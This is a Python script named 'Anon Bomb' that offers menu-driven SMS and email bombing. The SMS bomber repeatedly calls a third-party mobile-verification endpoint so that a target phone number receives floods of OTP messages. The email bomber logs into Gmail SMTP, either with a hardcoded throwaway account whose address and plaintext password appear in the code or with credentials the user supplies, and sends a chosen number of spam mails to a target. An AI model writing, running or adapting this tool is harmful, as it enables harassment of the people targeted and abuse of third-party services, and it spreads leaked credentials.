#pip install requests
import sys
import os
from time import sleep

def exit():
      print('\n>>> Exiting...')
      sleep(2)
      sys.exit()

#SMS Bomber------------------------------------------------

def sbomb():
      import sys
      import os
      import requests as rq
      from requests.structures import CaseInsensitiveDict
      from time import sleep

      def exit():
            print('\n>>> Exiting...')
            sleep(2)
            sys.exit()

      def clear():
            if os.name=='nt':
                  os.system('cls')
            else:
                  os.system('clear')

      def banner():
            b='''
░██████╗░░░░░░██████╗░░█████╗░███╗░░░███╗██████╗░
██╔════╝░░░░░░██╔══██╗██╔══██╗████╗░████║██╔══██╗
╚█████╗░█████╗██████╦╝██║░░██║██╔████╔██║██████╦╝
░╚═══██╗╚════╝██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗
██████╔╝░░░░░░██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝
╚═════╝░░░░░░░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░
      '''
            print(b)

      def bomb():
            number=str(input(">>> [!] Enter Target Number: +88"))
            amount=int(input(">>> [!] Enter Amount Of SMS: "))
            url = "https://toffeelive.com/app/service.php"
            headers = CaseInsensitiveDict()
            headers["Content-Type"] = "application/x-www-form-urlencoded"
            data = "phoneNumber="+number+"&route=auth_verify_mobile_no"
            resp = rq.post(url, headers=headers, data=data)
            for i in range(amount):
                  resp = rq.post(url, headers=headers, data=data)
                  if resp.status_code==200:
                        print(f'>>> [+] {i+1} SMS Sent Successfully')
                  elif resp.status_code==201:
                        print(f'>>> [+] {i+1} SMS Sent Successfully')
            sleep(2)
            input('\n>>> Task Done! Press Enter to Return...')
            sleep(2)
            

      while True:
            try:
                  while True:
                                    clear()
                                    banner()
                                    bomb()
                                    return main()
            except KeyboardInterrupt:
                  exit()



#Email Bomber-------------------------------------------------




def ebomb():
      import smtplib
      import os
      import sys
      from time import sleep

      def exit():
            print('\n>>> Exiting...')
            sleep(2)
            sys.exit()

      def clear():
            if os.name=='nt':
                  os.system('cls')
            else:
                  os.system('clear')

      def banner():
            banner='''
███████╗░░░░░░██████╗░░█████╗░███╗░░░███╗██████╗░
██╔════╝░░░░░░██╔══██╗██╔══██╗████╗░████║██╔══██╗
█████╗░░█████╗██████╦╝██║░░██║██╔████╔██║██████╦╝
██╔══╝░░╚════╝██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗
███████╗░░░░░░██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝
╚══════╝░░░░░░╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░

      '''
            print(banner)
      def works():
            clear()
            banner()
            print('''\nHow does it works?

Ans. This tool use Gmail smtp server (smtp.gmail.com) to Send mails. It need a Gmail Account. As you can see in the Menu, There is 2 Method to send mails, 1st one is Default Method and 2nd one is Custom Method. Default Method use a Fake Gmail account to Send mails which is Limited to 2000 mails Per day. If default method's Limit Reached/Doesn't Send Emails, then you have to choose 2nd one which is Custom Method. Custom Method ask you for a gmail account's 'Address' and 'Password' to send mail/Start email bombing. Don't worry, your Password is Secured. It is Recommended to use a Fake Gmail Account otherwise your friend will CATCH you...

Enjoy!''')
            input('\n>>> Press enter to Return...')



      while True:
            try:
                  while True:
                        clear()
                        banner()
                        print('''Choose a option below:
  1. Use default settings (recommended)
  2. Use custom settings''')
                        choice=str(input("\n>>> Enter your choice (1/2): "))
                        if choice in ('1','2'):
                              if choice=='1':
                                    email=str('gdriveman4@gmail.com')
                                    pwd=str('hackology')
                                    clear()
                                    banner()
                                    break
                              if choice=='2':
                                    print("\nTo use This Method, Make sure you turned ON 'Less secure app access' from here: https://myaccount.google.com/lesssecureapps\n")
                                    email=str(input('[*] Enter your Gmail Address: '))
                                    pwd=str(input("[*] Enter given Gmail's Password: "))
                                    clear()
                                    banner()
                                    break
                        else:
                              print('>>> Invalid Input')
                              sleep(2)


                  bomb=smtplib.SMTP('smtp.gmail.com','587')
                  bomb.ehlo()
                  bomb.starttls()
                  target=str(input('>>> [*] Enter target email: '))
                  amount=int(input('>>> [*] Enter amount of mail: '))
                  subject='BOMBitUP'
                  body="""What is BOMBitUP?
      
Ans. It is an app for sending sms to your friends really fast and prank them. We have more API's than any other sms bomber and hence it can send more sms and it is the best sms bomber. This is an international sms bomber and work properly in most of the countries. Here you can also choose the speed of sending sms. The high speed you will select, faster will be the sms sent. We have created this app to prank your friends and family by sending them unlimited sms.
      
How it helps in Bulk SMS Marketing?
      
Ans. Today SMS ( Short Message Service ) is the one of the effective way for marketing in business. If you are starting a new company, You should learn sms marketing for sure. You can promote your business using Bulk SMS Marketing in less cost as it is cost effective. Even if you have you a small business, you can afford it. SMS is a direct way to reach your customer. Businesses can reach big audience with sms marketing and it dosen't matter where the business is based. There are overall 5 Billion subscribers who have phones with sms service enabled.
      
How is Bulk SMS Marketing helpful?
      
Fast Deployment: Bulk SMS Allows you to send bulk messages to all of your users at the same time. This shows how you can save time and get faster results using bulk sms marketing. Highly Cost Effective:It is highly cost effective. All other advertising sources such as TV Advertisement, Printing etc. are costly. As compared to this bulk sms marketing is cheap. About 82.1% is the SMS Open rate that means 82 people will check sms sent by you using the software out of 100 people. One more advantage is you can also target a specific audience and send sms to the targeted audience to promote your business in specific areas."""

                  msg=f'Subject: {subject}\n\n{body}'
                  bomb.login(email,pwd)
                  for i in range(amount):
                        bomb.sendmail(email,target,msg)
                        print(f'>>> [+] {i+1} Mail Sent Successfully')
                        if i+1==amount:
                              sleep(2)
                              input('>>> All Mail Sent Successfully\n>>> Press enter to exit... ')
                              return main()
            except KeyboardInterrupt:
                  exit()


def main():
      while True:
            try:
                  def exit():
                        print('\n>>> Exiting...')
                        sleep(2)
                        sys.exit()

                  def clear():
                        if os.name=='nt':
                              os.system('cls')
                        else:
                              os.system('clear')

                  def banner():
                        banner='''

░█████╗░███╗░░██╗░█████╗░███╗░░██╗
██╔══██╗████╗░██║██╔══██╗████╗░██║
███████║██╔██╗██║██║░░██║██╔██╗██║
██╔══██║██║╚████║██║░░██║██║╚████║
██║░░██║██║░╚███║╚█████╔╝██║░╚███║
╚═╝░░╚═╝╚═╝░░╚══╝░╚════╝░╚═╝░░╚══╝

        ██████╗░░█████╗░███╗░░░███╗██████╗░
        ██╔══██╗██╔══██╗████╗░████║██╔══██╗
        ██████╦╝██║░░██║██╔████╔██║██████╦╝
        ██╔══██╗██║░░██║██║╚██╔╝██║██╔══██╗
        ██████╦╝╚█████╔╝██║░╚═╝░██║██████╦╝
        ╚═════╝░░╚════╝░╚═╝░░░░░╚═╝╚═════╝░
                  \n>>> This tool is for FUN, Not for Revenge!
                        '''
                        print(banner)
                  def menu():
                        menu='''Choose a tool below:
  1. SMS Bombing
  2. Email Bombing
  3. Exit'''
                        print(menu)

                  clear()
                  banner()
                  menu()
                  choice=str(input('\n>>> Enter your choice (1/2/3): '))
                  if choice in ('1','2','3'):
                        if choice=='1':
                              sbomb()
                        elif choice=='2':
                              ebomb()
                        elif choice=='3':
                              exit()
                  else:
                        print('\n>>> Invalid Input')
                        sleep(2)


            except KeyboardInterrupt:
                  exit()



if __name__=='__main__':
      main()
